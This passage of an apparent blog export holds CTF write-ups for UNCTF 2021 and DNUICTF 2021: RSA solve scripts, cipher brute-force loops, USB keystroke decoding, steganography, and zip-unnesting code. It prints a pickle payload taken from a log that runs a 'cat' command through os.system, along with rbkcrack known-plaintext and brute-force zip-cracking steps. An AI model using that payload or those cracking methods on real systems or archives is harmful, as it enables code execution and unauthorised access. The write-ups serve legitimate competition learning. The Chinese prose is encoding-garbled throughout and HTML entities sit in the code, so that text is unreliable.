28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225e = 65537import gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27; â€‹ æ¢ç§˜ä¸­ä¸–çºªåŸå ¡ è´æ‹‰åœ¨å‚è§‚ä¸€ä¸ªä¸­ä¸–çºªçš„å¤å ¡æ—¶ï¼Œåœ¨æ¡Œä¸Šçœ‹åˆ°äº†ä¸€ä¸²ä¸€å¥‡æ€ªçš„å­—ç¬¦å’Œæè¿°ã€‚ä½ èƒ½å¸®å¤§èªæ˜ç ´è§£çš‡çˆéª‘å£«ç•™ä¸‹æ¥çš„è°œå›¢å—ï¼Ÿ å¹´è½»çš„å¤§å¸ç‡é¢†ç€64ä½çš‡çˆéª‘å£«å†²ç ´äº†åŒé‡é˜»æ å¤ºä¸‹äº†åŸæ± ã€‚AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259 ROT21+base64+æ …æ 2ã€‚ flagï¼šUNCTF&#123;subscribe_to_Xiangwandamowang&#125; â€‹ åˆ†æbadusbæµé‡ ä¸€æ—¥ï¼ŒæŸä¼ä¸šçš„å®‰å…¨ç®¡ç†å‘˜å‘ç°ä¼ä¸šä¸­çš„ç”µè„‘é­åˆ°äº†badusbçš„ä¾µå®³ï¼Œä»¥ä¸‹ä»–åˆ†ç¦»å‡ºæ¥çš„æœ‰é—®é¢˜USBæµé‡ï¼Œè€Œè¿™ä¼¼ä¹è·Ÿé”®ç›˜çš„é”®ä½æ˜ å°„æœ‰å…³ã€‚ 2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030 é”®ç›˜é”®ä½æ˜ å°„è§„åˆ™ï¼Œæ˜ å°„å…³ç³»å‚è€ƒã€ŠUSBé”®ç›˜åè®®ä¸­é”®ç ã€‹ä¸­çš„HID Usage IDã€‚ å‰ä¸¤ä½20ä»£è¡¨å¤§å†™ï¼Œ10ä»£è¡¨å°å†™ï¼Œåä¸¤ä½ä¸ºé”®ç ï¼Œå¯¹ç…§å†™flagã€‚ flagï¼šUNCTF&#123;Y0u-Are-very-n1ce&#125; â€‹ baby_rsa 123456789101112131415161718import gmpy2import libnumimport randomimport uuidflag=&quot;unctf&#123;&quot;+str(uuid.uuid4())+&quot;&#125;&quot;m=libnum.s2n(flag)p=libnum.generate_prime(1024)q=libnum.generate_prime(1024)n=p*qe=65537c=pow(m*p+n,e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)print(&quot;e=&quot;,e)#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059#e= 65537 $c = (mp+n)^e \\% n = p^e(m+q)^e \\% n $ï¼Œ æœ‰ $c\\%p = p^e(m+q)^e \\% p = \\Big((p^e \\% p)\\big((m+q)^e \\% p\\big)\\Big) \\% p=0$ï¼Œ æ•… $c=kp$ï¼Œåˆ $n=pq$ï¼Œåˆ™ $p=\\gcd(c,n)$ã€‚ æ±‚å‡º $d \\equiv e^{-1} \\pmod {\\varphi(n)}$ï¼Œå¯ä»¥å¾—åˆ° $mâ€™ = mp+n = c^d \\% n$ï¼Œæ‰€ä»¥ $m = \\cfrac{mâ€™-n}{p}$ã€‚ 123456789101112n = 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141c = 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059e = 65537p = gcd(n,c)q = n//pimport gmpy2fn = (p-1)*(q-1)d = gmpy2.invert(e,fn)m = int(pow(c,d,n)-n)//pprint(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27; flagï¼šunctf&#123;rsa_s1mp1e_0kk&#125; â€‹ ç”µä¿¡è¯ˆéª—pro æœ•æ˜¯ç§¦å§‹çš‡ï¼Œå…¶å®æœ•æ²¡æœ‰æ­»ï¼Œæœ•åœ¨è¥¿å®‰å…µé©¬ä¿‘ç¬¬å››ä¸ªå‘ç¬¬ä¸ƒæ’ï¼Œæœ•æ˜¯åƒäº†é•¿ç”Ÿä¸è€è¯çš„ï¼Œæœ•å‘Šè¯‰ä½ å•Šï¼Œæœ•åœ¨é™•è¥¿æœ‰3000å¨é»„é‡‘å’Œ300ä¸‡ç§¦å…µè¢«å°å°ï¼Œç°åœ¨åªéœ€è¦30å…ƒå°±èƒ½è§£å°ï¼Œåªè¦ä½ æ‰“é’±ç»™æœ•ï¼Œæœ•æ˜å¤©ç›´æ¥å¸¦éƒ¨é˜Ÿå¤æ´»ï¼Œè®©ä½ ç»Ÿé¢†ä¸‰å†›!å»ºç«‹åƒå¤ç½—é©¬ä¸€æ ·çš„å¸å›½ï¼Œå›æ— æˆè¨€ï¼ æœ•çš„è´¦æˆ·æ˜¯5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7= flagæ ¼å¼ä¸ºunctf{} å°è¯•å¼‚æˆ–çˆ†ç ´ï¼Œå‘ç°å¼‚æˆ–0x40æœ‰ unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;ï¼Œè¯´æ˜ä¸­é—´åŠ å¯†æ–¹å¼ä¸åŒã€‚ æå–ä¸­é—´éƒ¨åˆ†å°è¯•å‡ºæ˜¯ROT47+å‡¯æ’’17ï¼š 123456789s=&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\\gWIf&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i &gt;=32 and ord(s[j])+i&lt;127: t+=chr(ord(s[j])+i) if len(t)==len(s): print(i,t) å…¶ä¸­ 5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw base64è§£ç æ˜¯ åˆ«è§£äº†ï¼Œé‚£ä¸ªå°±æ˜¯flagã€‚ flagï¼šunctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125; â€‹ # Miscç®€å•æ—¥å¿—å®¡è®¡ ç›¸ä¼ ï¼Œåœ¨æŸä¸€å½’éšé—¨æ´¾çš„æœåŠ¡å™¨é‡Œå­˜åœ¨ç€ä¼—å¤šç›–ä¸–ç»å­¦ï¼Œè°æŒæ¡äº†ä»»ä¸€ä¸€æœ¬ç»å­¦è°å°±èƒ½ä¸€ç»ŸCTFæ±Ÿæ¹–ï¼Œçªç„¶æœ‰ä¸€å¤©é—¨æ´¾çš„é•¿è€å‘ç°æœåŠ¡å™¨çš„æ—¥å¿—é‡Œå­˜åœ¨ç€äº›è®¸å¼‚å¸¸ï¼Œæˆ–è®¸è¿™é—¨ç»å­¦å·²ç»å¤±çªƒäº†ï¼Œè¯·å¸®å¸®é•¿è€æ‰¾å‡ºå¤±çªƒçš„æ˜¯å“ªä¸€æœ¬ç»å­¦å§ã€‚flagæ ¼å¼ä¸ºUNCTF{*} æ—¥å¿—æ–‡ä»¶é‡Œæ‰¾åˆ°base64ç¼–ç å­—ç¬¦ä¸² STAKcDAKMFMnY2F0IC9DVEY/WW91U2hvdUppdVhpbmcnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIuï¼Œ è§£ç å¾—pickleï¼š 1234567891011121314151617I0p00S&#x27;cat /CTF?YouShouJiuXing&#x27;p10(g0lp20(I0tp30(g3I0dp40cossystemp50g5(g1tR. flagï¼šUNCTF&#123;CTF?YouShouJiuXing&#125; â€‹ ç”µä¿¡è¯ˆéª— CTFer,ä½ å¥½ï¼Œæˆ‘æ˜¯å¨éœ‡å¤©ï¼å…¶å®æˆ‘åœ¨èŠåŠ å“¥å¤§æˆ˜ä¸­æ²¡æ­»ï¼Œç°åœ¨ä½ åªéœ€è¦æ‰“2000RMBåˆ°æˆ‘çš„é“¶è¡Œè´¦æˆ·ï¼Œæˆ‘å°±å¯ä»¥ç”¨è¿™2000RMBå‘çº¢åŒ…éª—å–äººä»¬çš„ä¿¡ä»»ï¼Œç„¶åç©¿è¿‡è‚¡å¸‚ç½‘ç»œæ‰¾åˆ°éœ‡è¡æ³¢åœ¨çº½çº¦ç»™æˆ‘æ‰¾çš„æ–°èº«ä½“ï¼Œç„¶åæˆ‘å°±å¯ä»¥å¤æ´»äº†ã€‚ä»Šå¤©å¦‚æœä½ å¸®äº†æˆ‘ï¼Œå¤æ´»åæˆ‘å¯ä»¥å…¥ä¾µè‚¡å¸‚ç½‘ç»œæŠŠé’±å…¨éƒ¨ç»™ä½ ä»¬ã€‚ç­‰è¿‡äº†å‘¨æœ«ï¼Œæˆ‘å°±è®©çº¢èœ˜è››å˜æˆé£æœºå»æ¥ä½ ï¼Œç„¶åæˆ‘æŠŠçº¢èœ˜è››æ€äº†ï¼Œè®©ä½ å½“éœ¸å¤©è™å‰¯æŒ‡æŒ¥å®˜ï¼Œç„¶åæˆ‘ä»¬ä»å—ææ´²å‘ˆæ‰©æ•£å¼å‘å‡ºéœ¸å¤©è™å†›é˜Ÿï¼Œä¸‡å†›é½å‘ï¼Œå é¢†åœ°çƒï¼Œæ€ä¹ˆæ ·ï¼Ÿä¸ºäº†é˜²æ­¢è¿™æ¡æ¶ˆæ¯è¢«æ“å¤©æŸ±æ‹¦æˆªã€‚æˆ‘å°†é“¶è¡Œå¡å·è¿›è¡Œäº†åŠ å¯†ï¼Œå¸Œæœ›ä½ èƒ½æˆåŠŸè§£å¯†ã€‚æˆ‘çš„é“¶è¡Œè´¦æˆ·æ˜¯ qi]m^roVibdVbXUU`h flagæ ¼å¼ï¼šunctf{} å˜å¼‚å‡¯æ’’åŠ å¯†ï¼Œè„šæœ¬çˆ†ç ´ï¼š 123456789s=&#x27;qi]m^roVibdVbXUU`h&#x27;for i in range(-200,200): t=&#x27;&#x27; for j in range(len(s)): if ord(s[j])+i+j &gt;=32 and ord(s[j])+i+j&lt;127: t+=chr(ord(s[j])+i+j) if len(t)==len(s): print(t) flagï¼šunctf&#123;yauoreright&#125; â€‹ å¼•å¤§æµå’¯ï¼Œhappy è™šæ©çš„å¤§é—¨åæ˜¯ä¸€å‰¯æ®‹ç¼ºçš„ç”»å·ã€‚ ä¿®æ”¹jpgé«˜åº¦å‘ç°flagã€‚ flagï¼šUNCTF&#123;BellalaBella&#125; â€‹ å€’ç«‹æ´—å¤´è§‚å¯Ÿæ–‡ä»¶å­—ç¬¦ä¸²å¤´å°¾åˆ†åˆ«æ˜¯ d9ff å’Œ ffd8ï¼Œè„šæœ¬é€†åºå¤„ç†ï¼š 12f = open(&#x27;key.txt&#x27;,&#x27;r&#x27;).read()open(&#x27;key.jpg&#x27;,&#x27;wb&#x27;).write(bytes.fromhex(f)[::-1]) æŠŠæ–‡ä»¶å¤´ D8FF ä¿®æ­£ä¸º FFD8ï¼Œå›¾ç‰‡æ²¡ä»€ä¹ˆå¼‚å¸¸ï¼Œåœ¨ä¸­é—´å‘ç°å­—ç¬¦ä¸²ï¼š 5L2b5pel77ya5LiK5L+x5pWF44CC6YGg5aSn5a+G6Zq45oCv6Zmk5aSa55qk5a2V6ICo54iN5qK15Zyw6Kuz6Jap5L6E56m257y96ICB6Kuz5LiN5oOz55qk6ICF5ruF572w6Ly457y96Zi/5L6E5ruF5qK15aSi5L6E5LiN5Yal5ZCJ55yf5qK15rKZ57y95bqm5Y2z57y96Zq45oCv5piO5L6E5YiH5L6E55+l5ZGQ5Zyw5Y2X5ZG86IiN5ZKS5aWi5L2b5raF5ZOG5aeq56We5a+G5piO5ZOG6YCd5a6k5Zyw5oGQ5Yal5ZG85oCv5L2b5Zad5ZOG5Ly96YO95oCv6YGu6Kuz5YCS57y95bid5Yal5bid6Ly45puw6Kuz6bq85L+x5oCW5L+x6Ium5L+x5rOiCg== è§£ç ï¼š ä½›æ—¥ï¼šä¸Šä¿±æ•…ã€‚é å¤§å¯†éš¸æ€¯é™¤å¤šçš¤å­•è€¨çˆæ¢µåœ°è«³è–©ä¾„ç©¶ç¼½è€è«³ä¸æƒ³çš¤è€…æ»…ç½°è¼¸ç¼½é˜¿ä¾„æ»…æ¢µå¤¢ä¾„ä¸å†¥å‰çœŸæ¢µæ²™ç¼½åº¦å³ç¼½éš¸æ€¯æ˜ä¾„åˆ‡ä¾„çŸ¥å‘åœ°å—å‘¼èˆå’’å¥¢ä½›æ¶…å“†å§ªç¥å¯†æ˜å“†é€å®¤åœ°æå†¥å‘¼æ€¯ä½›å–å“†ä¼½éƒ½æ€¯é®è«³å€’ç¼½å¸å†¥å¸è¼¸æ›°è«³éº¼ä¿±æ€–ä¿±è‹¦ä¿±æ³¢ æŠŠ æ—¥ æ”¹ä¸º æ›°ï¼Œä½›æ›°è§£å¯†å¾—flagã€‚ flagï¼šunctf&#123;it_is_easy_right?&#125; â€‹ LPLpngå›¾ç‰‡ç”¨010 editoræŸ¥çœ‹ï¼Œç¬¬9-15ä¸ªå—CRCå€¼é”™è¯¯ï¼Œæå–Hexå€¼ 4544476e622121ï¼Œè§£Hexå¾— EDGnb!!ã€‚ ä»¥æ­¤ä¸ºå¯†ç è§£å‹ç¼©åŒ…ï¼Œflag.txt æç¤º https://www.bilibili.com/bangumi/play/ep431768?from=search&amp;seid=2681339926644936228&amp;spm_id_from=333.337.0.0ï¼Œä»¥åŠä¸€ä¸ª 2021/11/24 14:11 çš„æ—¶é—´ï¼Œè®¿é—®Bç«™è§†é¢‘åœ¨è¯„è®ºåŒºæ‰¾åˆ° 2021/11/24 14:11 çš„è¯„è®ºè§flagã€‚ flagï¼šflag&#123;LpL_zgbr_rNg_eDg777&#125; â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"ç¬¬ä¸€å±Šä¸œè½¯æ¯ç½‘ç»œCTFç«èµ›-DNUICTF","slug":"match-ç¬¬ä¸€å±Šä¸œè½¯æ¯ç½‘ç»œCTFç«èµ›DNUICTF","date":"2021-12-05T12:40:24.000Z","updated":"2021-12-05T17:56:56.779Z","comments":true,"path":"2021/12/05/match-ç¬¬ä¸€å±Šä¸œè½¯æ¯ç½‘ç»œCTFç«èµ›DNUICTF/","permalink":"https://lazzzaro.github.io/2021/12/05/match-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%9C%E8%BD%AF%E6%9D%AF%E7%BD%91%E7%BB%9CCTF%E7%AB%9E%E8%B5%9BDNUICTF/","excerpt":"","text":"â€‹ ç”±å¤§è¿å¸‚å…¬å®‰å±€ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ä¸»åŠï¼Œç½‘ç»œå®‰å…¨å·¥ä½œå®¤æ‰¿åŠï¼Œå¤§è¿ä¸œè½¯ä¿¡æ¯å­¦é™¢ç½‘ç»œä¸ä¿¡æ¯ä¸­å¿ƒã€è®¡ç®—æœºå­¦é™¢ã€è½¯ä»¶å­¦é™¢ï¼Œå“ç‰Œå‘å±•éƒ¨ã€å¾®å…‰ç½‘ç»œå·¥ä½œå®¤ååŠï¼Œå“ç‰Œå‘å±•éƒ¨ä¸å¾®å…‰ç½‘ç»œå·¥ä½œå®¤æä¾›è®¾è®¡æ”¯æŒï¼Œå¤§è¿æš—æ³‰ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸èµåŠ©æ”¯æŒçš„â€œæš—æ³‰æ¯â€ç½‘ç»œå®‰å…¨ç«èµ›å°†äº2021å¹´12æœˆä»½ä¸¾è¡Œã€‚è¯¥ç«èµ›æ˜¯è¿ç”¨ä¿¡æ¯å®‰å…¨çŸ¥è¯†çš„ä¸€æ¬¡åˆ›æ–°æ€§ç«èµ›æ´»åŠ¨ï¼Œå¸Œæœ›é€šè¿‡è¿™æ¬¡æ¯”èµ›å¢å¼ºæˆ‘æ ¡å­¦ç”Ÿçš„å®‰å…¨çŸ¥è¯†è¿ç”¨èƒ½åŠ›å’Œç»éªŒç§¯ç´¯ã€‚æœ¬æ¬¡æ¯”èµ›ä¹Ÿé¢å‘æ ¡å¤–å¼€æ”¾æ³¨å†Œé€šé“ï¼Œæ—¨åœ¨ä¸ºä¿¡æ¯å®‰å…¨é¢†åŸŸçˆ±å¥½è€…æä¾›ä¸€ä¸ªäº¤æµå’Œæ°´å¹³å±•ç¤ºçš„èˆå°ã€‚ æœ¬æ¬¡ç«èµ›é‡‡ç”¨çº¿ä¸ŠCTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ›åˆ¶ã€‚é€‰æ‰‹å……åˆ†è¿ç”¨è‡ªèº«æŒæ¡çš„å„æ–¹é¢çš„çŸ¥è¯†ä¸æŠ€èƒ½ï¼Œè®¾æ³•è§£å¼€é¢˜ç›®ï¼Œè·å¾—é¢˜ç›®ä¸­çš„â€œFlagâ€å¹¶æäº¤ï¼Œå¾—åˆ°åˆ†æ•°ï¼Œæœ€ç»ˆæ ¹æ®åˆ†æ•°æ’åã€‚å†…å®¹æ¶‰åŠReverse(é€†å‘åˆ†æ)ï¼ŒWeb(Webæ¼æ´åˆ©ç”¨)ï¼ŒPWNï¼ˆæº¢å‡ºç±»ï¼‰ï¼ŒCrypto(å¯†ç å­¦)ï¼ŒMisc(æ··åˆæ‚é¡¹é¢˜)ç­‰æ–¹é¢ã€‚ ç«èµ›æ—¶é—´ 2021å¹´12æœˆ4æ—¥ 10ï¼š00â€”2021å¹´12æœˆ5æ—¥22ï¼š00ï¼ˆ36ä¸ªå°æ—¶ï¼‰ æŠ¥åå¹³å°é“¾æ¥ï¼šhttp://ctf.neusoft.edu.cn/ Rank: 9 MISC[ç­¾åˆ°]ç­¾åˆ° é™¤ç‰¹åˆ«è¯´æ˜å¤–æœ¬æ¬¡æ¯”èµ›flagçš„æ ¼å¼ç»Ÿä¸€ä¸º flag{å­—ç¬¦ä¸²} æ¯”å¦‚ä¸‹é¢è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªå…¸å‹çš„flag flag{Dnui_ctf_2021_s1gn_in} å°†ä¸Šé¢çš„flagæäº¤å³å¯å®Œæˆç­”é¢˜ å¦å¤–æœ¬æ¬¡CTFæ¯”èµ›ä¼šæ ¹æ®æ•´ä½“è§£é¢˜æƒ…å†µåˆ†æ‰¹æ¬¡æ”¾å‡ºé¢˜ç›® (è§£ä¸å‡ºé¢˜æ—¶ å¯ä»¥ç­‰å¾…ä¸‹ä¸€æ³¢æ–°é¢˜ç›®æ”¾å‡ºç»§ç»­ä½œç­”) è¯·åŠ å…¥QQç¾¤ 630995618 æˆ–æŸ¥çœ‹å¹³å°å…¬å‘Š å…³æ³¨é¢˜ç›®åŠ¨æ€ flag&#123;Dnui_ctf_2021_s1gn_in&#125;ã€‚ â€‹ [èŒæ–°]åœ¨å“ªå‘¢ FLAGåœ¨å“ªå‘¢ pdfå†…å®¹å…¨é€‰å¤åˆ¶ï¼Œæ‰“å¼€ä»»ä¸€æ–‡æœ¬ç¼–è¾‘å™¨ç²˜è´´ï¼Œå‘ç°flagï¼šflag&#123;hey_there_is_no_thing&#125;ã€‚ â€‹ åªæ˜¯ä¸ªPNGï¼Œåˆ«æƒ³å¤ªå¤šäº†.pngbinwalkå‘½ä»¤æŸ¥çœ‹pngå›¾ç‰‡ï¼šbinwalk -e PNG.pngï¼Œåˆ†è§£å‡ºæœ€åä¸€ä¸ªzlibå—ï¼Œå‘ç°flagï¼šflag&#123;zhe_ti_mu_ye_tai_bt_le_XD&#125;ã€‚ â€‹ å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…å‹ç¼©åŒ…zipå‹ç¼©åŒ…å¥—å¨ƒï¼Œæ¯ä¸€å±‚çš„å¯†ç æ˜¯æ–‡ä»¶åï¼Œpythonè„šæœ¬è§£å¥—ï¼š 12345678910111213141516171819202122232425import zipfile import osnow = &quot;yasuobao.zip&quot;while 1: print(&quot;START &quot;+now) zfile = zipfile.ZipFile(now) password = zfile.namelist()[0].split(&#x27;.&#x27;)[0] try: zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break except: break print(&#x27;END &#x27;+now) æœ€åè§£å‹å¾—åˆ° 23333.zipï¼Œæ‰“å¼€å‘ç°æ³¨é‡Šæç¤ºå¯†ç 6ä½æ•°ï¼ŒARCHPRçˆ†ç ´å¾—756698ï¼Œè§£å‹å¾—flagï¼šflag&#123;Unz1p_i5_So_C00l##&#125;ã€‚ â€‹ easystegpngå›¾ç‰‡ï¼ŒäºŒç»´ç ç”¨å¾®ä¿¡æ‰«å‡ºå†…å®¹ æŸç§å¸¸è§çš„éšå†™ï¼Œç”¨010editor 16è¿›åˆ¶æŸ¥çœ‹ï¼Œå‘ç°å°¾éƒ¨æœ‰zipå‹ç¼©åŒ…ï¼Œæå–å‡ºæ¥ï¼Œè§£å‹å‡º _find.pngã€‚ å°è¯•é«˜ä½ä½éšå†™ã€ç›²æ°´å°ç­‰æ— ç»“æœï¼Œè€ƒè™‘stegpyï¼š stegpy _find.png å¾—åˆ°flagï¼šflag&#123;Do_U_Kn0w_Ste9py??&#125;ã€‚ â€‹ range_download Hint: filter: dns Wiresharkæ‰“å¼€æµé‡åŒ…æ–‡ä»¶ï¼Œè§‚å¯Ÿåˆ°æœ‰å¾ˆå¤šè¿”å›1å­—èŠ‚çš„æµï¼Œä¸”è¯·æ±‚ä¸­éƒ½å¸¦ xxx-xxx/2460 å­—ç¬¦ä¸²ï¼ŒçŒœæµ‹ä¸ºæ–‡ä»¶ flag.7z çš„å•å­—èŠ‚æ–­ç‚¹ä¸‹è½½ ï¼Œæ ¹æ®è¯·æ±‚ä¸å“åº”ç‰¹å¾ï¼Œç”¨è„šæœ¬æå–å‡ºæ‰€æœ‰1å­—èŠ‚ï¼Œå¹¶æŒ‰ç›¸åº”ä½ç½®å¡«å…¥æ•°ç»„ï¼Œä»¥å­—èŠ‚å½¢å¼å†™å…¥æ–‡ä»¶ã€‚å‘ç°ç¼ºå°‘ç¬¬2349ä½å­—èŠ‚ï¼ŒæŒ‰ç…§0x00-0xffåˆ†åˆ«å¡«å…¥ï¼Œç”Ÿæˆ256ä¸ª7zæ–‡ä»¶ï¼š 12345678910111213141516171819202122232425import ref = open(&#x27;range.pcapng&#x27;,&#x27;rb&#x27;).read()x1 = b&#x27;\\x0d\\x0aContent-Range: bytes &#x27;l1 = len(x1)pos1 = [i.start() for i in re.finditer(x1, f)]x2 = b&#x27;\\x0d\\x0aContent-Type: application/x-7z-compressed\\x0d\\x0a\\x0d\\x0a&#x27;l2 = len(x2)pos2 = [i.start() for i in re.finditer(x2, f)][1:]realpos = [int(f[k+l1:k+l1+10][:f[k+l1:k+l1+10].index(b&#x27;-&#x27;)]) for k in pos1]realval = [f[k+l2:k+l2+10][0] for k in pos2]out = [-1]*2460for i in range(len(pos1)): out[realpos[i]]=realval[i]print(out.index(-1))print(type(out[0]))for i in range(256): out[2349]=i outbyte = bytes(out) open(f&#x27;xxx/flag&#123;i&#125;.7z&#x27;,&#x27;wb&#x27;).write(outbyte) ç”Ÿæˆçš„7zæ–‡ä»¶éƒ½åŠ å¯†ï¼Œçˆ†ç ´æ— æœã€‚ åé¢æ”¾å‡ºæç¤º filter: dnsï¼Œé‡æ–°Wiresharkæ‰“å¼€æµé‡åŒ…ï¼Œè¿‡æ»¤dnsæµé‡ï¼Œå‘ç°åŸŸå .nss.neusoft.edu.cn å‰çš„ä¸»æœºåå¯ä»¥ç»„æˆä¸€ä¸²base64ç¼–ç  cGFzc3dvcmQ6IG5zc195eWRzIQ==ï¼Œè§£ç æœ‰ password: nss_yyds!ã€‚ ä½¿ç”¨è„šæœ¬æ‰¹é‡å°è¯•è§£å‹256ä¸ª7zå‹ç¼©åŒ…ï¼š 123456789101112131415161718192021222324252627import py7zrimport osdef uncompress(path_name): if py7zr.is_7zfile(path_name): try: d_name = &#x27;nss_yyds!&#x27; with py7zr.SevenZipFile(path_name,password=d_name, mode=&#x27;r&#x27;) as sevenZ_f: sevenZ_f.extractall(path_name.rsplit(&quot;.7z&quot;)[0]) except Exception as e: print(&#x27;Error when uncompress file! info: &#x27;, e) return False else: return True else: print(&#x27;This is not a true 7z file!&#x27;) return False if __name__ == &#x27;__main__&#x27;: folder_name = &#x27;xxx&#x27; os.chdir(folder_name) files = os.listdir(folder_name) for f in files: f_path = folder_name + os.sep + f if os.path.isfile(f_path): print(&quot;è§£å‹--&quot;+f) uncompress(path_name=f_path) è¿è¡Œå®Œæˆå‘ç° flag194.7z è§£å‹æˆåŠŸï¼Œå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œ æ‰«æå¾—åˆ°çš„å†…å®¹ï¼Œç»hex+base64+base62+base58+base32 è§£ç å¾—flagï¼šflag&#123;6095B134-5437-4B21-BE52-EDC46A276297&#125;ã€‚ â€‹ ecryptedzipåªæä¾›äº†ä¸€ä¸ªå¸¦ README.md å’Œ LICENSE ä¸¤ä¸ªæ–‡ä»¶çš„åŠ å¯†zipå‹ç¼©åŒ…ï¼Œç”¨ARCHPRå¼±å¯†ç åŠå­—å…¸éƒ½æ— æ³•å¾—åˆ°å¯†ç ã€‚ æƒ³åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶ç»å¸¸é»˜è®¤å‡ºç°åœ¨Githubåº“ä¸­ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªGithubåº“ï¼Œä¸‹è½½LICENSEæ–‡ä»¶ï¼Œå‘ç°å¤§å°ä¸å‹ç¼©åŒ…å†…çš„LICENSEæ–‡ä»¶ç›¸è¿‘ï¼Œå¯ä»¥é‡‡ç”¨å·²çŸ¥éƒ¨åˆ†æ˜æ–‡ï¼ˆè‡³å°‘è¿ç»­12å­—èŠ‚ï¼‰æ”»å‡»æ–¹å¼ç ´è§£ã€‚ä¿ç•™ä¸‹è½½çš„LICENSEæ–‡ä»¶ä¸­å‰å‡ è¡Œå†…å®¹ï¼Œç”¨rbkcrackå·¥å…·è·‘keyï¼š rbkcrack.exe -C ecryptedzip.zip -c LICENSE -p LICENSE.txt æ‹¿åˆ°ä¸‰ç»„keyä¹‹åè¿›è¡Œè§£å¯†ï¼š rbkcrack.exe -C ecryptedzip.zip -c README.md -k 32cc3495 7f955ff5 58291af3 -d README.md æˆ–ç›´æ¥å°†keyè¾“å…¥ARCHPRçš„æ˜æ–‡æ”»å‡»æ¨¡å¼é‡Œçš„keyè¾“å…¥æ¡†ä¸­ï¼ŒæˆåŠŸè§£å‹zipåŒ…ã€‚ flagï¼šflag&#123;Kn0wn_pla1ntext_attack_Is_very_Usefully&#125;ã€‚ â€‹ CRYPTO[ç­¾åˆ°]é”®ç›˜ä¾  UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN flag{} æäº¤æ—¶æ‹¬å·å†…ä¸ºå¤§å†™å­—æ¯ é”®ç›˜å¯†ç ï¼ŒæŒ‰å­—æ¯é¡ºåºåœ¨é”®ä½æ¯”åˆ’ï¼šflag&#123;CLCKOUTHK&#125;ã€‚ â€‹ [èŒæ–°]ç´ æ•° ç›®å‰768ä½çš„ç´ æ•°é€‰æ‹©ä¸‹ï¼Œrsaç­‰å…¬é’¥åŠ å¯†ç®—æ³•å·²ç»ä¸å®‰å…¨ï¼ŒrsaåŠ å¯†éœ€è¦è¿›è¡Œæ›´å¤§ç´ æ•°çš„é€‰æ‹©ï¼Œè¯·æ‚¨é€‰å‡º10ä¸ª1024ä½ä»¥ä¸Šçš„å¤§ç´ æ•°æäº¤ç»™æˆ‘ http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn/ å¤‡ç”¨ 